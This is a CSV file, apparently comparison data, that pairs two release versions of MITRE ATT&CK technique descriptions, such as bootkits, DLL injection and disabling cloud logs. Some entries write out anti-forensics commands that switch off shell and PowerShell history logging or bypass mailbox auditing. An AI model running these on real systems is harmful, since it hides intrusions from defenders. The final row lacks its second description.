item_id,attack_id,release_a,release_b,name_a,name_b,description_a,description_b
A001,T1063,5.0,6.0,Security Software Discovery,Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. These checks may be built into early-stage remote access tools.

### Windows

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.

### Mac

It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.","Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.


### Windows

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.

### Mac

It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software."
A002,T1150,2.0,3.0,Plist Modification,Plist Modification,"Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UT-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). 
Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)

Detection: File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like ""Knock Knock"" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

Platforms: macOS

Data Sources: File monitoring, Process Monitoring, Process command-line parameters

Defense Bypassed: Application whitelisting, Process whitelisting, Whitelisting by file name or path

Permissions Required: User, Administrator","Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UT-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). 
Adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)"
A003,T1498.001,10.0,11.0,Direct Network Flood,Direct Network Flood,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001) are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)","Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.

Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)"
A004,T1067,2.0,3.0,Bootkit,Bootkit,"A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)

Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

===Master Boot Record===
The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

===Volume Boot Record===
The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

Detection: Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.

Platforms: Linux, Windows

Data Sources: API monitoring, MBR, VBR

Permissions Required: Administrator, SYSTEM","A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)

Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

### Master Boot Record
The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

### Volume Boot Record
The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code."
A005,T1612,9.0,10.0,Build Image on Host,Build Image on Host,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)

An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ","Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)

An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. "
A006,T1016,2.0,3.0,System Network Configuration Discovery,System Network Configuration Discovery,"Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: User","Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103)."
A007,T1069,2.0,3.0,Permission Groups Discovery,Permission Groups Discovery,"Adversaries may attempt to find local system or domain-level groups and permissions settings. 

===Windows===

Examples of commands that can list groups are <code>net group /domain</code> and <code>net localgroup</code> using the Net utility.

===Mac===

On Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for the domain, or <code>dscl . -list /Groups</code> for local groups.

===Linux===

On Linux, local groups can be enumerated with the <code>groups</code> command and domain groups via the <code>ldapsearch</code> command.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, Windows, macOS

Data Sources: API monitoring, Process command-line parameters, Process monitoring

Permissions Required: User","Adversaries may attempt to find local system or domain-level groups and permissions settings. 

### Windows

Examples of commands that can list groups are <code>net group /domain</code> and <code>net localgroup</code> using the [Net](https://attack.mitre.org/software/S0039) utility.

### Mac

On Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for the domain, or <code>dscl . -list /Groups</code> for local groups.

### Linux

On Linux, local groups can be enumerated with the <code>groups</code> command and domain groups via the <code>ldapsearch</code> command."
A008,T1562.008,12.0,13.0,Disable Cloud Logs,Disable Cloud Logs,"An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. 

Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic)","An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities.

For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)"
A009,T1112,18.0,19.0,Modify Registry,Modify Registry,"Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.

The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)","Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.

The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to impair defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)"
A010,T1005,6.0,7.0,Data from Local System,Data from Local System,"Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.

Adversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
","Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
"
A011,T1562.003,10.0,11.0,Impair Command History Logging,Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. 

On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.

Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.

On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)","Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. 

On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.

Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. 

On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging."
A012,T1153,5.0,6.0,Source,Source,"The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. 

Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.","The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)

Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand."
A013,T1119,6.0,7.0,Automated Collection,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.","Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files."
A014,T1070,10.0,11.0,Indicator Removal on Host,Indicator Removal on Host,"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1552/003) and /var/log/*.

These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.","Adversaries may delete or modify artifacts generated on a host system to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
A015,T1109,2.0,3.0,Component Firmware,Component Firmware,"Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.

Platforms: Windows

Defense Bypassed: Anti-virus, File monitoring, Host intrusion prevention systems

Permissions Required: SYSTEM

System Requirements: Ability to update component device firmware from the host operating system.","Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks."
A016,T1055.001,11.0,12.0,Dynamic-link Library Injection,Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) 

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ","Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) 

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 

Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. "
A017,T1117,5.0,6.0,Regsvr32,Regsvr32,"Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)","Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)"
A018,T1123,2.0,3.0,Audio Capture,Audio Capture,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.

Detection: Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.

Platforms: Linux, macOS, Windows

Data Sources: API monitoring, Process monitoring, File monitoring

Permissions Required: User","An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later."
A019,T1074,2.0,3.0,Data Staged,Data Staged,"Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Data Compressed or Data Encrypted.

Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.

Detection: Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters","Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Data Compressed](https://attack.mitre.org/techniques/T1002) or [Data Encrypted](https://attack.mitre.org/techniques/T1022).

Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location."
A020,T1666,18.0,19.0,Modify Cloud Resource Hierarchy,Modify Cloud Resource Hierarchy,"Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  

IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)

Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)

